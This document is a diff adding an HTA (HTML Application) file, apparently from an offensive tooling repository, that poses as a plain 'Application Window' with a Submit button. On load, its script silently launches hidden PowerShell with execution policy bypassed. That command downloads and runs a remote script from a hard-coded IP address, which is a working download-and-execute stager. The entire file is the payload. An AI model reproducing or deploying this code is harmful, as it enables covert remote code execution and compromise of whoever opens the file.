@@ -1,0 +1,15 @@
+<html>
+  <head>
+    <title>PowerShell HTA Example</title>
+          <meta content="text/html; charset=utf-8" http-equiv="Content-Type" />
+    <hta:application applicationname="HTA Shell" version="1.0" />
+	<script>
+	var c = "cmd.exe /c powershell.exe -w hidden -ep bypass -c \"\"IEX ((new-object net.webclient).downloadstring('http://166.78.254.10/connect'))\"\"";
+    new ActiveXObject('WScript.Shell').Run(c);
+	</script>
+  </head>
+  <body>
+  Application Window
+  <button onclick="self.close()">Submit</button>
+  </body>
+</html>
